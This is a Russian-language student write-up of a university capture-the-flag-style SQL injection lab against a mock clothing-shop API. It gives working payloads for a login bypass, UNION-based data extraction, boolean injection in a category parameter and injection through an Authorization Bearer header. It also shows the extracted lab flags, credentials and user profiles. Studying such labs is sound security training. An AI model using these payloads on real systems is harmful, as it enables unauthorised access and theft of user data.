# ЛР3 SQLi. Попытка Cheerful-Island

## Стенд

Название лабораторной: Cheerful-Island
UUID: 281597ea-a798-410d-9e81-43bb6b4ce978
Тип сайта: магазин одежды
URL: http://ibks.spbstu.ru:8086/away/281597ea-a798-410d-9e81-43bb6b4ce978
API prefix: /away/281597ea-a798-410d-9e81-43bb6b4ce978/api
Создана: 06.05.2026 18:07 МСК
Запущена: 06.05.2026 18:08 МСК

## Правила текущего прогона

- Работа только вручную через Burp Repeater.
- Без sqlmap.
- Без Burp Intruder.
- Без ZAP Active Scan.
- Без массового перебора.
- Не использовать одиночную кавычку как первый тест.
- В ручные запросы добавлять Connection: close.
- Старый стенд d613d6fc-55c3-40d9-a03c-53607ac0c422 больше не использовать.

## Найденные API endpoints

- GET /api/products
- GET /api/categories
- GET /api/products?category=...
- GET /api/orders
- POST /api/login

## Наблюдения

GET /api/orders до авторизации отправляется с Authorization: Bearer null и возвращает пустой массив [].

POST /api/login с телом {"username":"123","password":"123"} возвращает 401 Invalid credentials.

GET /api/products возвращает товары с полями:
article, category, description, name, price, released, stock.

Примеры article:
3294072781203
1676646676085
8191762921015
686442091921
2614096477325

## Флаги

ibks1_{} =

ibks2_{} =

ibks3_{} =

## Итоговый ответ

secret_

## Успешный SQLi bypass в /api/login

Ручка:

POST /away/281597ea-a798-410d-9e81-43bb6b4ce978/api/login

Payload:

    {"username":"admin","password":"' OR 1=1-- "}

Результат:

    HTTP/1.1 200 OK
    Set-Cookie: user=admin; Path=/; SameSite=Lax

Тело ответа:

    Login successful: user=RealDictRow({'login': 'side_product@hotmail.com', 'password': 'fG5NLJlz**HXA#3X', 'role': 'user'})

Вывод:

    SQL-инъекция в поле password позволяет обойти проверку учетных данных.
    Backend авторизует запрос и возвращает первую найденную запись из таблицы users.
    Cookie при этом устанавливается по переданному username, то есть user=admin.

## Дополнение: успешная авторизация реальным пользователем

После SQLi bypass в /api/login сервер вернул реального пользователя:

    login: side_product@hotmail.com
    password: fG5NLJlz**HXA#3X
    role: user

Затем была выполнена авторизация с этими учетными данными:

    {"username":"side_product@hotmail.com","password":"fG5NLJlz**HXA#3X"}

Результат:

    HTTP/1.1 200 OK
    Set-Cookie: user=side_product@hotmail.com

Проверенные после входа ручки:

    GET /api/orders -> []
    GET /api/profile/favorites -> {"favorites":[]}
    GET /api/profile/reviews -> []
    GET /api/profile -> {"message":"User not found"}

Вывод:

    Найденные учетные данные валидны для /api/login, но связанные пользовательские разделы пока не содержат флаги.
    Дальнейшая эксплуатация должна идти через SQLi в /api/login, используя UNION SELECT.

## Найденные флаги

Флаги были получены через SQL Injection в POST /api/login с использованием UNION SELECT.

Использованный канал вывода:

    Login successful: user=RealDictRow({'login': ..., 'password': ..., 'role': ...})

Итоговый запрос извлек значения из колонок secret во всех пользовательских таблицах.

Найденные значения:

    reviews=ibks3_{93f8739c36549}
    user_personal_info=ibks1_{653b6e69e46c8}
    products=ibks2_{9a7d9c2fcbeaf}

Флаги по порядку:

    ibks1_{653b6e69e46c8}
    ibks2_{9a7d9c2fcbeaf}
    ibks3_{93f8739c36549}

Итоговый ответ для сдачи:

    secret_653b6e69e46c89a7d9c2fcbeaf93f8739c36549

## Статус

Практическая SQLi-часть выполнена: все три флага найдены.

## Дополнительные сведения, полученные через SQLi

### Характеристики PostgreSQL

Через UNION SELECT в ручке POST /api/login были получены сведения о сервере БД.

Запрос server_info вернул:

    PostgreSQL 15.12 (Debian 15.12-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit

Запрос db_info вернул:

    database: 281597ea_a798_410d_9e81_43bb6b4ce978
    database user: sqli_user
    schema: public

Запрос server_addr вернул:

    172.18.0.6/32:5432

Запрос max_connections вернул:

    100

Запрос activity_count вернул:

    26

### Пользователи приложения

Через таблицу users были извлечены учетные записи пользователей приложения.

Найденный пользователь-администратор:

    login: everybody_use@rambler.ru
    password: (WUM70hl*5gaAQfg
    role: admin

Вывод:

    SQL-инъекция позволяет не только обойти авторизацию, но и получить учетные данные пользователей приложения, включая администратора.

## Альтернативные пути эксплуатации

### Вход под найденным администратором

Через SQLi в /api/login была извлечена учетная запись администратора:

    login: everybody_use@rambler.ru
    password: (WUM70hl*5gaAQfg
    role: admin

После входа под этой учетной записью открылся личный кабинет пользователя.

GET /api/profile с Authorization: Bearer everybody_use@rambler.ru вернул профиль:

    username: everybody_use@rambler.ru
    name: Потап Витальевич Зайцев
    birthDate: Wed, 26 Sep 2001 00:00:00 GMT
    address: г. Данков, пер. Угольный, д. 7, 641900
    phone: +7 (639) 795-69-11

При этом связанные разделы администратора оказались пустыми:

    GET /api/orders -> []
    GET /api/profile/favorites -> {"favorites":[]}
    GET /api/profile/reviews -> []

Вывод:

    Полученные через SQLi учетные данные администратора валидны и позволяют войти в приложение.

### Boolean-based SQLi в параметре category

Проверялась ручка:

    GET /api/products?category=...

Payload true:

    category=x' OR '1'='1'--

Результат:

    сервер вернул список товаров.

Payload false:

    category=x' AND '1'='2'--

Результат:

    сервер вернул пустой массив [].

Вывод:

    параметр category уязвим к SQL Injection.
    Поведение true/false payload-ов подтверждает boolean-based SQLi.

### Попытка UNION в category

Payload:

    category=x' UNION SELECT 1,'cat','desc','name','1.00',true,1--

Результат:

    HTTP 500 Internal Server Error
    UNION types integer and boolean cannot be matched

Вывод:

    UNION-канал в category потенциально возможен, но требует точного совпадения типов колонок.
    Ошибка показывает, что в шестой колонке ожидается integer, а не boolean.

### Проверка path-параметра article

Обычный запрос:

    GET /api/products/3294072781203

вернул карточку товара.

Запросы с добавлением SQL-выражений в path:

    /api/products/3294072781203 OR 1=1
    /api/products/3294072781203 AND 1=2

вернули 404 Not Found.

Вывод:

    SQLi в path-параметре article не подтверждена.
    Вероятно, запрос отсекается на уровне Flask route до выполнения SQL-запроса.

### Проверка Authorization Bearer

Проверялась ручка:

    GET /api/profile/favorites

Payload:

    Authorization: Bearer x' OR '1'='1'--

Результат:

    HTTP 500 Internal Server Error
    unterminated quoted string at or near "'x''"
    WHERE favorite_products.login = 'x''

Вывод:

    значение из Authorization Bearer подставляется в SQL-запрос.
    Это указывает на потенциальную SQL Injection в авторизационном заголовке.
    Payload с пробелами, вероятно, был обрезан при разборе Bearer-токена.

### Ошибки write-endpoints

При обращении к POST /api/favorites и POST /api/products/{article}/reviews возникала ошибка:

    function datetime(unknown) does not exist

Вывод:

    backend использует SQL-конструкцию datetime('...'), характерную для SQLite.
    В PostgreSQL такая функция отсутствует, поэтому write-endpoints падают с ошибкой.
    Эти ручки далее не тестировались, чтобы не изменять данные стенда.

### Успешный UNION SELECT в category

После уточнения типов колонок был выполнен payload:

    category=x' UNION SELECT 1,'cat','desc','name',1.00,1,true--

Результат:

    HTTP/1.1 200 OK

В ответе появилась искусственная строка товара:

    article: 1
    category: name
    description: desc
    name: cat
    price: 1.00
    released: true
    stock: 1

Вывод:

    параметр category является полноценным UNION-based SQLi-вектором.
    Через него можно внедрять собственные строки в JSON-ответ /api/products.

### Подтвержденная SQLi в Authorization Bearer

Дополнительно проверялась ручка:

    GET /api/profile

Payload в заголовке Authorization:

    Authorization: Bearer x'/**/OR/**/'1'='1'--

Пробелы были заменены на SQL-комментарии /**/, так как Bearer-токен, вероятно, разбирается через split по пробелу.

Результат:

    HTTP/1.1 200 OK

Сервер вернул профиль реального пользователя:

    username: dinner_employee@gmail.com
    name: Михайлова Валентина Архиповна
    birthDate: Wed, 23 Mar 1949 00:00:00 GMT
    address: п. Подольск, алл. Энтузиастов, д. 93 к. 6/4, 519409
    phone: +7 (777) 289-3235

Вывод:

    SQL-инъекция в Authorization Bearer подтверждена.
    Значение Bearer-токена небезопасно подставляется в SQL-условие поиска пользователя.
    Инъекция позволяет получить профиль другого пользователя.

### Проверка favorite_products

Через основной UNION-канал в /api/login была проверена таблица favorite_products:

    SELECT count(*) FROM favorite_products

Результат:

    favorite_count = 10

При этом запрос /api/profile/favorites с Bearer-инъекцией вернул пустой массив.

Вывод:

    таблица favorite_products содержит записи, но конкретная ручка /api/profile/favorites не дала полезного вывода через проверенный Bearer-payload.
    Возможные причины: особенности JOIN-запроса, фильтрация товаров или отсутствие избранного у первого пользователя, выбранного условием OR 1=1.

## Завершение лабораторной на портале

Итоговый ответ был отправлен на портал:

    secret_653b6e69e46c89a7d9c2fcbeaf93f8739c36549

Результат:

    лабораторная работа принята порталом и получила статус "Выполнена".

Данные завершения:

    Название лабораторной: Cheerful-Island
    UUID: 281597ea-a798-410d-9e81-43bb6b4ce978
    Создана: 06.05.2026 18:07
    Запущена: 06.05.2026 18:08
    Решена: 06.05.2026 19:07
    Остаток времени после сдачи: примерно 02:00:36

Итог практической SQLi-части:

    1. Найдены все три флага.
    2. Подтверждена SQLi в POST /api/login.
    3. Через UNION SELECT получены таблицы, колонки, флаги, пользователи, администратор и сведения о PostgreSQL.
    4. Подтверждена SQLi в GET /api/products?category=...
    5. Подтверждена SQLi в Authorization Bearer на GET /api/profile.
    6. Лабораторная успешно сдана на портале.
